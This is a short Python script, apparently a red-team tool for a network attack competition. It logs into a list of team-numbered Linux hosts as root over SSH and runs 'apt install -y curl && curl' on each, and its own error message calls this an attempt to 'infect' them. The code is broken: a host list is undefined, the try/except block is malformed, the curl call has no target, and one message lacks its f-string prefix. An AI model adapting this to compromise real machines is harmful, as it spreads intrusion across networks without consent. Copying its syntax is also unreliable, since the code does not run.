import os
import subprocess
from threading import Thread

TEAM = os.environ['TEAM']

host1 = '10.{}.1.69'.format(TEAM)
host2 = '10.{}.1.6'.format(TEAM)

# 172.16.x.0/24 (1 ≤ x ≤ 15)
# 10.x.1.0/24 (x ≥ 1)

LINUX_IPS = [
    '10.X.1.6',
    '10.X.1.7',
    '10.X.1.8',
    '10.X.1.9',
    '10.X.1.69',
    '172.16.X.1 ',
    '172.16.X.11',
    '172.16.X.12',
    '172.16.X.20',
]


class BingoBangoThread(Thread):
    def __init__(self, team_num):
        super().__init__()
        self.team_num = team_num
        self.windows = [x.replace('X', str(team_num)) for x in WINDOWS_IPS]
        self.linux = [x.replace('X', str(team_num)) for x in LINUX_IPS]

    def run(self):
        for linux in self.linux:
            p = subprocess.run(
                ['ssh', f'root@{linux}', '"apt install -y curl && curl "'])
        try:
            except Exception as ex:
                self.print(
                    'Exception while trying to infect {linux} via ssh: {ex}')

    def print(self, message):
        print(f'[{self.team_num}] {message}')
